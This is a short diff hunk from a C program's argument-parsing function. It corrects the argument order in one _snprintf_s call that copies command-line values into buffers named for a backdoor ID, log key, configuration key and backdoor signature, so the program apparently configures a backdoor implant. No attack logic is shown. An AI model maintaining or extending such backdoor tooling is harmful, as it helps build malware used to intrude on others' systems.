@@ -203,7 +203,7 @@ parseArguments (int argc, TCHAR **argv)
     }
 
   _snprintf_s (szBackdoorID, sizeof(szBackdoorID), _TRUNCATE, "%s", argv[1]);
-  _snprintf_s (szLogKey, sizeof(szLogKey), "%s", _TRUNCATE, argv[2]);
+  _snprintf_s (szLogKey, sizeof(szLogKey), _TRUNCATE, "%s", argv[2]);
   _snprintf_s (szConfigurationKey, sizeof(szConfigurationKey), _TRUNCATE, "%s", argv[3]);
   _snprintf_s (szBackdoorSignature, sizeof(szBackdoorSignature), _TRUNCATE, "%s", argv[4]);
   _snprintf_s (szFilename, sizeof(szFilename), _TRUNCATE, "%s", argv[5]);
